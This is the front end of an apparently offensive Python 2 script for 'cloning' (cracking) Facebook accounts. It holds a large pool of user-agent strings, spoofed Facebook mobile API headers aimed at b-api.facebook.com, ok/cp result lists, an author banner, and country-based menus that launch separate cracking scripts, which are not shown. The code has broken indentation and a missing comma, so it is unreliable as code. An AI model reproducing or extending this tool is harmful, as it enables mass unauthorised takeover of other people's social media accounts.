  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokia-7.1-safari",
  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo ="""

\033[1;37m    d8888b. d888888b .d8888. db   db db    db 
\033[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
\033[1;32m    88oobY'    88    `8bo.   88ooo88 88    88 
\033[1;32m    88`8b      88      `Y8b. 88~~~88 88    88 
\033[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
\033[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
\033[1;97m-------------------------------------------------
\033[1;97m  ➤ Author  : Rishu Khan (\x1b[1;32mAL3X\x1b[1;37m)
\033[1;97m  ➤ Github  : https://github.com/Alon3-Rishu
\033[1;97m  ➤ Fb ID   : https://facebook.com/al3x.rishu
\033[1;97m-------------------------------------------------
\033[1;97m         [\033[1;97m\033[1;41mIF YOU DREAM IT CAN YOU DO IT\033[0m\x1b[1;37m]
\033[1;97m-------------------------------------------------"""

host = "https://b-api.facebook.com"
ok = []
cp = []

def update():
	os.system("clear")
        print(logo)
        print("")
        print("\033[1;92m  Installing Tools ...").center(50)
        time.sleep(5)
        country_main()
	
def country_main():
	os.system("clear")
	print(logo)
	print("Select Your Country").center(50)
	print("\033[1;97m-------------------------------------------------")
	time.sleep(2)
	print("\033[1;97m[1] \033[1;97mPakistan")
	print("\033[1;97m[2] \033[1;97mBangladesh")
	print("\033[1;97m[3] \033[1;97mIndia")
	print("\033[1;97m[4] \033[1;97mIndonesia")
	print("\033[1;97m[5] \033[1;97mNegeria")
	print("\033[1;97m[6] \033[1;97mNone ")
	print("\033[1;97m[0] \033[1;97mBack")
	print("\033[1;97m-------------------------------------------------")
	count()
def count():
	count = raw_input("\n\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if count =="1":
		os.system("rm -rf country.txt")
		main ="pk"
		try:
			ctry = open('country.txt','w')
			ctry.write(main)
			ctry.close()
			seclist()
		except (KeyError, IOError):
			seclist()
	elif count =="2":
		os.system("rm -rf country.txt")
		main ="bd"
		try:
			ctry = open('country.txt','w')
                        ctry.write(main)
                        ctry.close()
                        seclist()
		except (KeyError, IOError):
			seclist()
	elif count =="3":
		os.system("rm -rf country.txt")
		main ="id"
		try:
			ctry = open('country.txt','w')
                        ctry.write(main)
                        ctry.close()
                        seclist()
		except (KeyError, IOError):
			seclist()
	elif count =="4":
		os.system("rm -rf country.txt")
		main ="ind"
		try:
			ctry = open('country.txt','w')
                        ctry.write(main)
                        ctry.close()
                        seclist()
		except (KeyError, IOError):
			seclist()
	elif count =="5":
		os.system("rm -rf country.txt")
		main ="ng"
		try:
			ctry = open('country.txt','w')
                        ctry.write(main)
                        ctry.close()
                        seclist()
		except (KeyError, IOError):
			seclist()
	elif count =="6":
		os.system("rm -rf country.txt")
		main ="no"
		try:
			ctry = open('country.txt','w')
                        ctry.write(main)
                        ctry.close()
                        seclist()
		except (KeyError, IOError):
			seclist()
	elif count =="0":
		update()
	else:
		print("")
		time.sleep(2)
		print("select a valid option").center(50)
		print("")
		time.sleep(2)
		country_main()
	
def seclist():
	os.system("clear")
	print(logo)
	print("")
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[1\033[1;97m] Cloning Facebook Using Login")
	print("\033[1;97m[2\033[1;97m] Cloning From Type Of User-agent")
	print("\033[1;97m[3\033[1;97m] Tool Logout")
	print("\033[1;97m-------------------------------------------------")
	sct()
def sct():
	sect = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if sect =="1":
		      option_main()
	elif sect =="2":
		      agnets()
	elif sect =="3":
		      os.system("exit")
	else:
		      print("")
		      time.sleep(2)
		      print("\033[1;91mplease select a valid option").center(50)
		      print("")
		      time.sleep(2)
		      seclist()

def agnets():
	os.system("clear")
	print(logo)
	print("\x1b[1;32mSelect anyone option that you want to cloning").center(50)
        print("\033[1;97m-------------------------------------------------")
	time.sleep(2)
	print("\033[1;97m[1] Cloning With User-agents 01 (\x1b[1;32mfast method\x1b[1;37m) ")
	print("\033[1;97m[2] Cloning With User-agents 02 (\x1b[1;32mfast method\x1b[1;37m) ")
        print("\033[1;97m[0] Back")
        print("\033[1;97m-------------------------------------------------")
        agents2()
def agents2():
	main = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if main =="1":
		      os.system("python2 __a01__")
	elif main =="2":
		      os.system("python2 __a02__")
	elif main =="3":
		      seclist()
	else:
		      print("")
		      time.sleep(2)
		      print("please select a valid option")
		      print("")
		      time.sleep(2)
		      agents2()
		
def option_main():
	os.system("clear")
	print(logo)
	time.sleep(1)
	print("\x1b[1;32mType Of Login Menu Option").center(50)
	time.sleep(1)
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[1] Cloning From Old Menu \033[1;97m[ \033[1;92mBest Method\033[1;97m ] ")
	print("\033[1;97m[2] Cloning From New Menu ")
	print("\033[1;97m[0] Tool Logout")
	print("\033[1;97m-------------------------------------------------")
	opt()
def opt():
	opt = raw_input("\n\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if opt =="1":
		os.system("python2 __crack02__")
	elif opt =="2":
		okayabm()
	elif opt =="0":
		print("")
		time.sleep(1)
		print("\x1b[1;32mTool Logout Success").center(50)
		print("")
		time.sleep(1)
	else:
		print("")
		time.sleep(1)
		print("\x1b[1;31mPlease select a valid option").center(50)
		print("")
		time.sleep(1)

def okayabm():
	os.system("clear")
	print(logo)
	print("")
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[1] Clone Friendlist And Public ID")
	print("\033[1;97m[2] Cloning From Phone Number")
	print("\033[1;97m[3] Join Our Facebook Group")
	print("\033[1;97m[4] Contact To Owner (\x1b[1;32mRishu\x1b[1;37m)")
	print("\033[1;97m[5] Tool Logout")
	print("\033[1;97m-------------------------------------------------")
	abm2()
def abm2():
	abm_select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if abm_select =="1":
		      login_menu()
	elif abm_select =="2":
		      os.system("python2 nbr")
	elif abm_select =="3":
		      join_group()
	elif abm_select =="4":
		      os.system("xdg-open https://facebook.com/al3x.rishu")
		      time.sleep(1)
		      okayabm()
	elif abm_select =="5":
		      os.system("exit")
	else:
		      print("")
		      time.sleep(2)
		      print("\033[1;91mPlease select a valid option").center(50)
		      print("")
		      time.sleep(2)
		      okayabm()
		
def join_group():
	os.system("clear")
	print(logo)
	print("")
	raw_input("\t \x1b[1;37mPress Enter To Join Fb Group")
	time.sleep(2)
